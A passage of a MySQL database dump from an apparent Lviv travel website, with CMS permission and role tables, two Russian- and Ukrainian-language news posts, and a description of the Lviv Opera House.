двумя полосами по-львовски задумчевых фонарей. Кого здесь только не встретишь &mdash; и людей пожилого возраста, играющих свои бесконечные партии в шахматы, и совсем маленьких детей, и влюбленные пары, а также тех, кто умеет уединяться среди толпы и суеты.</div>', 'parks/May2018/SIuZR7cQFuBflgMy1cKf.jpg', 'parks/May2018/kBVgqRaPultSfoLxLxGG.jpg', 'parks/May2018/j2Nm6lvJs5fPz62QBbVS.jpg', 'parks/May2018/CtONEFnXRrsAVNk80f09.jpg', '2018-05-07 11:20:00', '2018-05-15 09:19:57', NULL);

-- --------------------------------------------------------

--
-- Структура таблицы `password_resets`
--

CREATE TABLE `password_resets` (
  `email` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `token` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Структура таблицы `permissions`
--

CREATE TABLE `permissions` (
  `id` int(10) UNSIGNED NOT NULL,
  `key` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `table_name` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `permission_group_id` int(10) UNSIGNED DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Дамп данных таблицы `permissions`
--

INSERT INTO `permissions` (`id`, `key`, `table_name`, `created_at`, `updated_at`, `permission_group_id`) VALUES
(1, 'browse_admin', NULL, '2018-04-05 09:40:18', '2018-04-05 09:40:18', NULL),
(2, 'browse_database', NULL, '2018-04-05 09:40:18', '2018-04-05 09:40:18', NULL),
(3, 'browse_media', NULL, '2018-04-05 09:40:18', '2018-04-05 09:40:18', NULL),
(4, 'browse_compass', NULL, '2018-04-05 09:40:18', '2018-04-05 09:40:18', NULL),
(5, 'browse_menus', 'menus', '2018-04-05 09:40:18', '2018-04-05 09:40:18', NULL),
(6, 'read_menus', 'menus', '2018-04-05 09:40:19', '2018-04-05 09:40:19', NULL),
(7, 'edit_menus', 'menus', '2018-04-05 09:40:19', '2018-04-05 09:40:19', NULL),
(8, 'add_menus', 'menus', '2018-04-05 09:40:19', '2018-04-05 09:40:19', NULL),
(9, 'delete_menus', 'menus', '2018-04-05 09:40:19', '2018-04-05 09:40:19', NULL),
(10, 'browse_pages', 'pages', '2018-04-05 09:40:19', '2018-04-05 09:40:19', NULL),
(11, 'read_pages', 'pages', '2018-04-05 09:40:19', '2018-04-05 09:40:19', NULL),
(12, 'edit_pages', 'pages', '2018-04-05 09:40:19', '2018-04-05 09:40:19', NULL),
(13, 'add_pages', 'pages', '2018-04-05 09:40:19', '2018-04-05 09:40:19', NULL),
(14, 'delete_pages', 'pages', '2018-04-05 09:40:19', '2018-04-05 09:40:19', NULL),
(15, 'browse_roles', 'roles', '2018-04-05 09:40:19', '2018-04-05 09:40:19', NULL),
(16, 'read_roles', 'roles', '2018-04-05 09:40:19', '2018-04-05 09:40:19', NULL),
(17, 'edit_roles', 'roles', '2018-04-05 09:40:20', '2018-04-05 09:40:20', NULL),
(18, 'add_roles', 'roles', '2018-04-05 09:40:20', '2018-04-05 09:40:20', NULL),
(19, 'delete_roles', 'roles', '2018-04-05 09:40:20', '2018-04-05 09:40:20', NULL),
(20, 'browse_users', 'users', '2018-04-05 09:40:20', '2018-04-05 09:40:20', NULL),
(21, 'read_users', 'users', '2018-04-05 09:40:20', '2018-04-05 09:40:20', NULL),
(22, 'edit_users', 'users', '2018-04-05 09:40:20', '2018-04-05 09:40:20', NULL),
(23, 'add_users', 'users', '2018-04-05 09:40:20', '2018-04-05 09:40:20', NULL),
(24, 'delete_users', 'users', '2018-04-05 09:40:20', '2018-04-05 09:40:20', NULL),
(25, 'browse_posts', 'posts', '2018-04-05 09:40:20', '2018-04-05 09:40:20', NULL),
(26, 'read_posts', 'posts', '2018-04-05 09:40:20', '2018-04-05 09:40:20', NULL),
(27, 'edit_posts', 'posts', '2018-04-05 09:40:20', '2018-04-05 09:40:20', NULL),
(28, 'add_posts', 'posts', '2018-04-05 09:40:20', '2018-04-05 09:40:20', NULL),
(29, 'delete_posts', 'posts', '2018-04-05 09:40:20', '2018-04-05 09:40:20', NULL),
(30, 'browse_categories', 'categories', '2018-04-05 09:40:20', '2018-04-05 09:40:20', NULL),
(31, 'read_categories', 'categories', '2018-04-05 09:40:21', '2018-04-05 09:40:21', NULL),
(32, 'edit_categories', 'categories', '2018-04-05 09:40:21', '2018-04-05 09:40:21', NULL),
(33, 'add_categories', 'categories', '2018-04-05 09:40:21', '2018-04-05 09:40:21', NULL),
(34, 'delete_categories', 'categories', '2018-04-05 09:40:21', '2018-04-05 09:40:21', NULL),
(35, 'browse_settings', 'settings', '2018-04-05 09:40:21', '2018-04-05 09:40:21', NULL),
(36, 'read_settings', 'settings', '2018-04-05 09:40:21', '2018-04-05 09:40:21', NULL),
(37, 'edit_settings', 'settings', '2018-04-05 09:40:21', '2018-04-05 09:40:21', NULL),
(38, 'add_settings', 'settings', '2018-04-05 09:40:21', '2018-04-05 09:40:21', NULL),
(39, 'delete_settings', 'settings', '2018-04-05 09:40:21', '2018-04-05 09:40:21', NULL),
(40, 'browse_hooks', NULL, '2018-04-05 09:40:24', '2018-04-05 09:40:24', NULL),
(46, 'browse_languages', 'languages', '2018-04-19 07:40:28', '2018-04-19 07:40:28', NULL),
(47, 'read_languages', 'languages', '2018-04-19 07:40:28', '2018-04-19 07:40:28', NULL),
(48, 'edit_languages', 'languages', '2018-04-19 07:40:28', '2018-04-19 07:40:28', NULL),
(49, 'add_languages', 'languages', '2018-04-19 07:40:28', '2018-04-19 07:40:28', NULL),
(50, 'delete_languages', 'languages', '2018-04-19 07:40:28', '2018-04-19 07:40:28', NULL),
(51, 'browse_owners', 'owners', '2018-04-19 07:40:36', '2018-04-19 07:40:36', NULL),
(52, 'read_owners', 'owners', '2018-04-19 07:40:36', '2018-04-19 07:40:36', NULL),
(53, 'edit_owners', 'owners', '2018-04-19 07:40:36', '2018-04-19 07:40:36', NULL),
(54, 'add_owners', 'owners', '2018-04-19 07:40:36', '2018-04-19 07:40:36', NULL),
(55, 'delete_owners', 'owners', '2018-04-19 07:40:36', '2018-04-19 07:40:36', NULL),
(56, 'browse_gids', 'gids', '2018-04-19 08:01:56', '2018-04-19 08:01:56', NULL),
(57, 'read_gids', 'gids', '2018-04-19 08:01:56', '2018-04-19 08:01:56', NULL),
(58, 'edit_gids', 'gids', '2018-04-19 08:01:56', '2018-04-19 08:01:56', NULL),
(59, 'add_gids', 'gids', '2018-04-19 08:01:56', '2018-04-19 08:01:56', NULL),
(60, 'delete_gids', 'gids', '2018-04-19 08:01:56', '2018-04-19 08:01:56', NULL),
(61, 'browse_excursions', 'excursions', '2018-04-19 08:46:42', '2018-04-19 08:46:42', NULL),
(62, 'read_excursions', 'excursions', '2018-04-19 08:46:42', '2018-04-19 08:46:42', NULL),
(63, 'edit_excursions', 'excursions', '2018-04-19 08:46:42', '2018-04-19 08:46:42', NULL),
(64, 'add_excursions', 'excursions', '2018-04-19 08:46:42', '2018-04-19 08:46:42', NULL),
(65, 'delete_excursions', 'excursions', '2018-04-19 08:46:42', '2018-04-19 08:46:42', NULL),
(71, 'browse_museums', 'museums', '2018-05-04 08:33:32', '2018-05-04 08:33:32', NULL),
(72, 'read_museums', 'museums', '2018-05-04 08:33:32', '2018-05-04 08:33:32', NULL),
(73, 'edit_museums', 'museums', '2018-05-04 08:33:32', '2018-05-04 08:33:32', NULL),
(74, 'add_museums', 'museums', '2018-05-04 08:33:32', '2018-05-04 08:33:32', NULL),
(75, 'delete_museums', 'museums', '2018-05-04 08:33:32', '2018-05-04 08:33:32', NULL),
(76, 'browse_memories', 'memories', '2018-05-07 08:10:16', '2018-05-07 08:10:16', NULL),
(77, 'read_memories', 'memories', '2018-05-07 08:10:16', '2018-05-07 08:10:16', NULL),
(78, 'edit_memories', 'memories', '2018-05-07 08:10:16', '2018-05-07 08:10:16', NULL),
(79, 'add_memories', 'memories', '2018-05-07 08:10:16', '2018-05-07 08:10:16', NULL),
(80, 'delete_memories', 'memories', '2018-05-07 08:10:16', '2018-05-07 08:10:16', NULL),
(81, 'browse_public_places', 'public_places', '2018-05-07 09:59:28', '2018-05-07 09:59:28', NULL),
(82, 'read_public_places', 'public_places', '2018-05-07 09:59:28', '2018-05-07 09:59:28', NULL),
(83, 'edit_public_places', 'public_places', '2018-05-07 09:59:28', '2018-05-07 09:59:28', NULL),
(84, 'add_public_places', 'public_places', '2018-05-07 09:59:28', '2018-05-07 09:59:28', NULL),
(85, 'delete_public_places', 'public_places', '2018-05-07 09:59:29', '2018-05-07 09:59:29', NULL),
(86, 'browse_parks', 'parks', '2018-05-07 11:10:57', '2018-05-07 11:10:57', NULL),
(87, 'read_parks', 'parks', '2018-05-07 11:10:57', '2018-05-07 11:10:57', NULL),
(88, 'edit_parks', 'parks', '2018-05-07 11:10:57', '2018-05-07 11:10:57', NULL),
(89, 'add_parks', 'parks', '2018-05-07 11:10:57', '2018-05-07 11:10:57', NULL),
(90, 'delete_parks', 'parks', '2018-05-07 11:10:57', '2018-05-07 11:10:57', NULL),
(96, 'browse_around_lvivs', 'around_lvivs', '2018-05-11 06:01:16', '2018-05-11 06:01:16', NULL),
(97, 'read_around_lvivs', 'around_lvivs', '2018-05-11 06:01:16', '2018-05-11 06:01:16', NULL),
(98, 'edit_around_lvivs', 'around_lvivs', '2018-05-11 06:01:16', '2018-05-11 06:01:16', NULL),
(99, 'add_around_lvivs', 'around_lvivs', '2018-05-11 06:01:16', '2018-05-11 06:01:16', NULL),
(100, 'delete_around_lvivs', 'around_lvivs', '2018-05-11 06:01:16', '2018-05-11 06:01:16', NULL),
(116, 'browse_tag', 'tag', '2018-05-24 09:11:19', '2018-05-24 09:11:19', NULL),
(117, 'read_tag', 'tag', '2018-05-24 09:11:19', '2018-05-24 09:11:19', NULL),
(118, 'edit_tag', 'tag', '2018-05-24 09:11:19', '2018-05-24 09:11:19', NULL),
(119, 'add_tag', 'tag', '2018-05-24 09:11:19', '2018-05-24 09:11:19', NULL),
(120, 'delete_tag', 'tag', '2018-05-24 09:11:19', '2018-05-24 09:11:19', NULL),
(131, 'browse_tags', 'tags', '2018-05-24 09:31:20', '2018-05-24 09:31:20', NULL),
(132, 'read_tags', 'tags', '2018-05-24 09:31:20', '2018-05-24 09:31:20', NULL),
(133, 'edit_tags', 'tags', '2018-05-24 09:31:20', '2018-05-24 09:31:20', NULL),
(134, 'add_tags', 'tags', '2018-05-24 09:31:20', '2018-05-24 09:31:20', NULL),
(135, 'delete_tags', 'tags', '2018-05-24 09:31:20', '2018-05-24 09:31:20', NULL),
(196, 'browse_sliders', 'sliders', '2018-05-25 06:23:53', '2018-05-25 06:23:53', NULL),
(197, 'read_sliders', 'sliders', '2018-05-25 06:23:53', '2018-05-25 06:23:53', NULL),
(198, 'edit_sliders', 'sliders', '2018-05-25 06:23:53', '2018-05-25 06:23:53', NULL),
(199, 'add_sliders', 'sliders', '2018-05-25 06:23:53', '2018-05-25 06:23:53', NULL),
(200, 'delete_sliders', 'sliders', '2018-05-25 06:23:53', '2018-05-25 06:23:53', NULL),
(201, 'browse_developments', 'developments', '2018-06-05 09:58:26', '2018-06-05 09:58:26', NULL),
(202, 'read_developments', 'developments', '2018-06-05 09:58:26', '2018-06-05 09:58:26', NULL),
(203, 'edit_developments', 'developments', '2018-06-05 09:58:26', '2018-06-05 09:58:26', NULL),
(204, 'add_developments', 'developments', '2018-06-05 09:58:26', '2018-06-05 09:58:26', NULL),
(205, 'delete_developments', 'developments', '2018-06-05 09:58:26', '2018-06-05 09:58:26', NULL),
(206, 'browse_theatres', 'theatres', '2018-06-05 11:20:38', '2018-06-05 11:20:38', NULL),
(207, 'read_theatres', 'theatres', '2018-06-05 11:20:38', '2018-06-05 11:20:38', NULL),
(208, 'edit_theatres', 'theatres', '2018-06-05 11:20:38', '2018-06-05 11:20:38', NULL),
(209, 'add_theatres', 'theatres', '2018-06-05 11:20:38', '2018-06-05 11:20:38', NULL),
(210, 'delete_theatres', 'theatres', '2018-06-05 11:20:38', '2018-06-05 11:20:38', NULL);

-- --------------------------------------------------------

--
-- Структура таблицы `permission_groups`
--

CREATE TABLE `permission_groups` (
  `id` int(10) UNSIGNED NOT NULL,
  `name` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Структура таблицы `permission_role`
--

CREATE TABLE `permission_role` (
  `permission_id` int(10) UNSIGNED NOT NULL,
  `role_id` int(10) UNSIGNED NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Дамп данных таблицы `permission_role`
--

INSERT INTO `permission_role` (`permission_id`, `role_id`) VALUES
(1, 1),
(1, 3),
(1, 4),
(1, 5),
(1, 6),
(2, 1),
(3, 1),
(4, 1),
(5, 1),
(6, 1),
(7, 1),
(8, 1),
(9, 1),
(10, 1),
(11, 1),
(12, 1),
(13, 1),
(14, 1),
(15, 1),
(16, 1),
(17, 1),
(18, 1),
(19, 1),
(20, 1),
(21, 1),
(22, 1),
(23, 1),
(24, 1),
(25, 1),
(25, 3),
(25, 6),
(26, 1),
(26, 3),
(26, 6),
(27, 1),
(27, 3),
(27, 6),
(28, 1),
(28, 3),
(28, 6),
(29, 1),
(29, 3),
(29, 6),
(30, 1),
(31, 1),
(32, 1),
(33, 1),
(34, 1),
(35, 1),
(36, 1),
(37, 1),
(38, 1),
(39, 1),
(40, 1),
(46, 1),
(47, 1),
(48, 1),
(49, 1),
(50, 1),
(51, 1),
(52, 1),
(53, 1),
(54, 1),
(55, 1),
(56, 1),
(56, 4),
(57, 1),
(57, 4),
(58, 1),
(58, 4),
(59, 1),
(59, 4),
(60, 1),
(60, 4),
(61, 1),
(61, 4),
(62, 1),
(62, 4),
(63, 1),
(63, 4),
(64, 1),
(64, 4),
(65, 1),
(65, 4),
(71, 1),
(72, 1),
(73, 1),
(74, 1),
(75, 1),
(76, 1),
(77, 1),
(78, 1),
(79, 1),
(80, 1),
(81, 1),
(82, 1),
(83, 1),
(84, 1),
(85, 1),
(86, 1),
(87, 1),
(88, 1),
(89, 1),
(90, 1),
(96, 1),
(97, 1),
(98, 1),
(99, 1),
(100, 1),
(116, 1),
(117, 1),
(118, 1),
(119, 1),
(120, 1),
(131, 1),
(132, 1),
(133, 1),
(134, 1),
(135, 1),
(196, 1),
(197, 1),
(198, 1),
(199, 1),
(200, 1),
(201, 1),
(202, 1),
(203, 1),
(204, 1),
(205, 1),
(206, 1),
(207, 1),
(208, 1),
(209, 1),
(210, 1);

-- --------------------------------------------------------

--
-- Структура таблицы `posts`
--

CREATE TABLE `posts` (
  `id` int(10) UNSIGNED NOT NULL,
  `author_id` int(11) NOT NULL,
  `category_id` int(11) DEFAULT NULL,
  `title` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `seo_title` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `excerpt` text COLLATE utf8mb4_unicode_ci,
  `body` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `image` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `image1` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `slug` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `meta_description` text COLLATE utf8mb4_unicode_ci,
  `meta_keywords` text COLLATE utf8mb4_unicode_ci,
  `status` enum('PUBLISHED','DRAFT','PENDING') COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT 'DRAFT',
  `featured` tinyint(1) NOT NULL DEFAULT '0',
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Дамп данных таблицы `posts`
--

INSERT INTO `posts` (`id`, `author_id`, `category_id`, `title`, `seo_title`, `excerpt`, `body`, `image`, `image1`, `slug`, `meta_description`, `meta_keywords`, `status`, `featured`, `created_at`, `updated_at`) VALUES
(4, 3, 1, 'Во Львове во время движения загорелся автобус', 'во Львове на улице Ивана Франко', 'Сегодня утром, 17 апреля, во Львове на улице Ивана Франко (возле центрального ЗАГСа) произошло ЧП с автобусом.', '<p style="box-sizing: border-box; margin: 0px 0px 20px; color: #272e36; font-family: \'Noto Sans\', sans-serif; font-size: 16px; text-align: center;">Сегодня утром, 17 апреля, во Львове на улице Ивана Франко (возле центрального ЗАГСа) произошло ЧП с автобусом.</p>\r\n<p style="box-sizing: border-box; margin: 0px 0px 20px; color: #272e36; font-family: \'Noto Sans\', sans-serif; font-size: 16px; text-align: center;">Об этом на своей странице в&nbsp;<a style="box-sizing: border-box; background-color: transparent; color: #d71119;" href="https://www.facebook.com/igor.zinkevych">Facebook</a>&nbsp;сообщил депутат Львовского горсовета Игорь Зинкевич.</p>\r\n<p style="box-sizing: border-box; margin: 0px 0px 20px; color: #272e36; font-family: \'Noto Sans\', sans-serif; font-size: 16px; text-align: center;">Судя по предоставленным фотографиям,&nbsp;<a style="box-sizing: border-box; background-color: transparent; color: #d71119;" href="https://golos.ua/i/606240">задымление</a>&nbsp;произошло в моторном отсеке автобуса.</p>\r\n<p style="box-sizing: border-box; margin: 0px 0px 20px; color: #272e36; font-family: \'Noto Sans\', sans-serif; font-size: 16px; text-align: center;">Пострадавших нет.</p>\r\n<p style="box-sizing: border-box; margin: 0px 0px 20px; color: #272e36; font-family: \'Noto Sans\', sans-serif; font-size: 16px; text-align: center;">Напомним, что вчера, 16 апреля, в городе Броды во Львовской области в 16:00 водитель&nbsp;<a style="box-sizing: border-box; background-color: transparent; color: #d71119;" href="https://golos.ua/i/607920">мотоцикла</a>&nbsp;Honda не справился с управлением и въехал в толпу людей. Пострадавшие с многочисленными травмами были госпитализированы.</p>\r\n<p style="text-align: center;">&nbsp;</p>', 'posts/April2018/oPjM0whiYLkpCzPRQJ8I.jpg', 'posts/April2018/p0gLsYwgJ73J76CuMGTg.jpg', 'vo-l-vove-vo-vremya-dvizheniya-zagorelsya-avtobus', 'ЧП с автобусом.', 'ЧП с автобусом.', 'PUBLISHED', 0, '2018-04-16 08:19:28', '2018-04-22 14:36:23'),
(5, 3, 1, 'Метеорологи прогнозують у Львові найсніжнішу зиму за останні 12 років', 'zima lviv', 'Британські метеорологи ошелешили жителів Європи невтішним прогнозом – такої холодної і затяжної зими, як та, що наближається, не було у цій частині світу упродовж останніх ста років. На думку фахівців, нас очікує різке і затяжне похолодання. У першій декаді грудня стовпчик термометра може опуститися нижче позначки 30 градусів морозу. Аномальний холод будуть супроводжувати ще й снігопади. Не омине цей несподіваний природный катаклізм і Україну…', '<h2 style="color: #000000; font-family: \'DejaVu Sans Mono\'; text-align: center;">Метеорологи прогнозують у Львові найсніжнішу зиму</h2>\r\n<pre style="font-family: \'DejaVu Sans Mono\';">Причиною таких кардинальних змін погоди стануть крижані маси арктичного <br />повітря над Європою і зниження сонячної активності. Наше світило входить<br />у період, подібний на той, що отримав назву &ldquo;мінімум Маундера&rdquo;.Під час <br />цього мінімуму (з 1645-го по 1715р.) відбувалося значне зменшення <br />кількості сонячних плям. Ці процеси свого часу збіглися з фазою глобального<br />похолодання клімату, яку спостерігали протягом 14&minus;19 століть.<br />Науковці, які обговорюють можливість приходу &ldquo;великої зими&rdquo; кілька <br />останніх років, прогнозують, що дуже холодний сезон-2017&minus;2018 буде лише <br />першим&ldquo;дзвіночком&rdquo;. </pre>\r\n<pre style="color: #000000; font-family: \'DejaVu Sans Mono\';"><img style="float: right;" src="http://lviv-travel/storage/posts/April2018/card-image-weather2.jpg" width="341" height="468" /><br />Що означаєтривале падіння темпера-<br />тури до позначки мінус 30 градусів<br />для нашої частини світу?<br />Варто зазирнути в історію <br />похолодання, яке Європа колись <br />пережила: під час зими 1708&minus;1709 <br />років земля промерзла вглиб більш <br />ніж на метр. Моря, озера і річки <br />замерзли,чимало риби загинуло у <br />кризі мілких водойм, що промерзли <br />до дна, або задихнулося через<br />нестачу кисню.<br /><br /><br /><br /><br />На полях вимерз весь урожай, мороз знищив оливкові дерева і виноградники.<br />Франція зазнала особливо великих втрат, бо холод привів за собою голод: <br />до кінця 1710 року у цій країні загинули приблизно 600 тис. осіб.<br />У наш час інфраструктура населених пунктів&ldquo;теплолюбних країн&rdquo; на сильні <br />морози переважно не розрахована.Яскравий приклад &ndash; &ldquo;алчевська трагедія<br />&rdquo; під Луганськом у 2006 році: поломка на станції центрального теплопос-<br />тачання при температурі мінус 35&deg;С призвела до катастрофи.Городяни<br />добре пам&rsquo;ятають і проблеми з транспортом під час холодів. Щойно вдарить <br />мороз &ndash; на рейс не виходять машини, бо солярка замерзає у паливопроводах.</pre>\r\n<h2 style="font-family: \'DejaVu Sans Mono\'; text-align: center;">Через 15&minus;20 років на Землі може настати льодовиковий період.</h2>\r\n<pre style="font-family: \'DejaVu Sans Mono\';">Опалювати помешкання і за відносно теплої зими для більшості пересічних<br />українців дорогезадоволення. Чимало народу у сільських хатах, хто не встиг <br />перейти на тверде паливо і дрова,включають котли на мінімум і сплять під <br />кількома ковдрами. Городянам, які користуються центральним опаленням, у <br />платіжках приходять захмарні суми. Якщо ж за вікном буде постійно мінус 30 <br />&ndash;вони стануть космічними.</pre>\r\n<pre style="color: #000000; font-family: \'DejaVu Sans Mono\';">Опосередкованим підтвердженням аномально холодної зими може стати той факт,<br />що російський &ldquo;Газпром&rdquo; збільшив транзит газу до Європи територією України <br />до найвищих показників за останні п&rsquo;ять років. У той самий час транспорту-<br />вання російського газу іншими маршрутами за аналогічний період залишалося <br />на стабільному рівні &ndash; тобто не зменшилось.Виходить, європейці активно <br />запасають доволі великі об&rsquo;єми газу у сховищах. Україна під час підготовки<br />до опалювального сезону заповнила підземні сховища газу приблизно на 50% &ndash;<br />до 15,7 млрд.кубічних метрів, повідомив у понеділок &ldquo;Укртранс&shy;газ&rdquo;. Взимку <br />зі сховищ витрачають по 23&minus;30 млн куб. на добу залежно від погоди.</pre>\r\n<pre style="font-family: \'DejaVu Sans Mono\';">Готуватися до зими потрібно, натомість панікувати не варто! Песимістичні <br />прогнози британських кліматологів розділяють не усі. Приміром, український <br />синоптик Лариса Луцан вважає, що робити прогнози на зиму у вересні ще <br />зарано. Більш-менш точно це можна робитинаприкінці жовтня або у листопаді.<br />А усі ці &ldquo;страшилки&rdquo;, вважає синоптик, нагадують психологічні атаки від <br />нашого сусіда-експортера блакитного палива. &ldquo;Такого року не було, щоб<br />нас чимось не лякали&rdquo;, &ndash; говорить фахівець. &ldquo;Ми ведемо спостереження з  <br />1946 року і маємо усю базу даних. Починаючи з 2010 року у нас зими помірно<br />теплі.Візьмемо минулу &ndash; лише січень був відносно холодним. А грудень і <br />лютий навіть на один градус теплішими від кліматичної норми. Глобальне <br />потепління ніхто не відміняв, і ми віримо лише даним, тому і прогнозуємо <br />нашу зиму помірно теплою, у межах кліматичної норми. Нерідко буває, що у <br />другій чи третій декаді жовтня, на початку листопада у нас випадає сніг з <br />утворенням нестійкого покриву, який одразу тане. А стійкий сніг на землі <br />випадає у листопаді-грудні і то не щороку. Днями ми телефонували до <br />нашого столичного науково-дослідного центру гідрометеорології &ndash; вони <br />також ще не мають даних, якою буде зима&rdquo;.</pre>', 'posts/April2018/N6Y0l9qhdmq90fkpWsYV.jpg', 'posts/April2018/GswV0jqOBXOsOY4MMHk7.jpg', 'meteorologi-prognozuyut-u-l-vovi-najsnizhnishu-zimu-za-ostanni-12-rokiv', 'Зима', 'Катаклізм', 'PUBLISHED', 0, '2018-04-17 07:00:35', '2018-04-22 14:33:18');

-- --------------------------------------------------------

--
-- Структура таблицы `public_places`
--

CREATE TABLE `public_places` (
  `id` int(10) UNSIGNED NOT NULL,
  `tag` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `name` text COLLATE utf8_unicode_ci NOT NULL,
  `slug` text COLLATE utf8_unicode_ci NOT NULL,
  `address` text COLLATE utf8_unicode_ci NOT NULL,
  `title` text COLLATE utf8_unicode_ci NOT NULL,
  `post` text COLLATE utf8_unicode_ci NOT NULL,
  `banner_photo` text COLLATE utf8_unicode_ci NOT NULL,
  `photo1` text COLLATE utf8_unicode_ci NOT NULL,
  `photo2` text COLLATE utf8_unicode_ci NOT NULL,
  `photo3` text COLLATE utf8_unicode_ci,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Дамп данных таблицы `public_places`
--

INSERT INTO `public_places` (`id`, `tag`, `name`, `slug`, `address`, `title`, `post`, `banner_photo`, `photo1`, `photo2`, `photo3`, `created_at`, `updated_at`) VALUES
(1, '', 'Львівський Оперний театр', 'l-vivs-kij-opernij-teatr', 'проспект Свободи, 28', 'Львівський Оперний театр – архітектурна перлина Львова у стилі неоренесансу (1901 рік), один з найгарніших театрів Європи.', '<h4><span style="box-sizing: border-box; outline: none; -webkit-tap-highlight-color: transparent; -webkit-font-smoothing: inherit; color: #000000; font-family: Raleway, sans-serif; font-size: 12pt;">&nbsp;<span style="box-sizing: border-box; outline: none; -webkit-tap-highlight-color: transparent; -webkit-font-smoothing: inherit; font-size: 10pt;">&nbsp;</span></span><span style="color: #000000; font-family: Tahoma; font-size: 12px;">Збудований на початку минулого століття за проектом архітектора Зиґмунта Ґорґолевського Великий театр у Львові порівнювали з Паризькою та Віденською оперою. Стоячи перед величним фасадом цієї фантастичної споруди відчуваєш всепоглинаючу потугу мистецтва, його вічність у контрасті зі швидкоплинністю людського життя. Це споруда, у якій можна знайти різні архітектурні стилі європейських країн, втілені з пишномовною імпозантністю.</span></h4>\r\n<h4><br style="color: #000000; font-family: Tahoma; font-size: 12px;" /><span style="color: #000000; font-family: Tahoma; font-size: 12px;">Форми фасаду дуже складні і різноманітні: це колони, балюстради, ніші, насичені алегоричними скульптурними постатями. Над головним карнизом фасаду височать статуї восьми муз, над ними горельєфна десятифігурна композиція &laquo;Радощі і страждання життя&raquo;. Фронтон угорі завершується скульптурною тріадою крилатих бронзових постатей Генія драми і комедії, трагедії і у центрі &ndash; Слави, яка тримає золоту пальмову гілку. Ці скульптури творили видатні львівські митці Попель, Баронч, Війтович.</span><br style="color: #000000; font-family: Tahoma; font-size: 12px;" /><br style="color: #000000; font-family: Tahoma; font-size: 12px;" /><span style="color: #000000; font-family: Tahoma; font-size: 12px;">Інтер&rsquo;єр львівської опери вражає не менше, ніж зовнішній вигляд.&nbsp;Внутрішнє убранство споруди оздоблене позолотою (на неї витратили декілька кілограмів золота), різнокольоровим мармуром, декоративними розписами і скульптурою. Чотириярусний глядацький зал має форму ліри і вміщує понад тисячу людей. Окрасою сцени є декоративна завіса &laquo;Парнас&raquo; (1900 рік) відомого у Європі живописця Генрика Семирадського &ndash; алегоричне трактування сенсу людського життя у постатях Парнасу.</span><br style="color: #000000; font-family: Tahoma; font-size: 12px;" /><br style="color: #000000; font-family: Tahoma; font-size: 12px;" /><span style="color: #000000; font-family: Tahoma; font-size: 12px;">Зал львівського оперного театру відзначається чудовою акустикою. Тут можна побачити виступи славетних оперних і балетних колективів України та гастролерів з інших країн. У львівській опері проводять нещодавно відроджені Віденські бали.</span></h4>', 'public-places/May2018/ScNk8xxKC3TYxsnZnzBE.jpeg', 'public-places/May2018/Dg5XjwQqcLob52X23ozo.jpg', 'public-places/May2018/bkwBnGEcHRputB2U5i87.jpg', 'public-places/May2018/71QKtc898eC98UUb7fyi.jpg', '2018-05-07 10:16:00', '2018-05-15 11:56:40');

-- --------------------------------------------------------

--
-- Структура таблицы `roles`
--

CREATE TABLE `roles` (
  `id` int(10) UNSIGNED NOT NULL,
  `name` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `display_name` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Дамп данных таблицы `roles`
--

INSERT INTO `roles` (`id`, `name`, `display_name`, `created_at`, `updated_at`) VALUES
(1, 'admin', 'Administrator', '2018-04-05 09:40:17', '2018-04-05 09:40:17'),
(2, 'user', 'Normal User', '2018-04-05 09:40:17', '2018-04-05 09:40:17'),
(3, 'moderator', 'Moderator', '2018-04-05 10:34:30', '2018-04-05 10:34:30'),
(4, 'gid', 'Gid', '2018-04-19 10:59:45', '2018-04-19 10:59:45'),
(5, 'organizer', 'Оrganizer', '2018-04-19 11:01:21', '2018-04-19 11:01:21'),
(6, 'editor', 'Еditor', '2018-04-19 11:02:48', '2018-04-19 11:02:48');

-- --------------------------------------------------------

--
-- Структура таблицы `settings`
--

CREATE TABLE `settings` (
  `id` int(10) UNSIGNED NOT NULL,
  `key` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `display_name` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `value` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `details` text COLLATE utf8mb4_unicode_ci,
  `type` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `order` int(11) NOT NULL DEFAULT '1',
  `group` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL
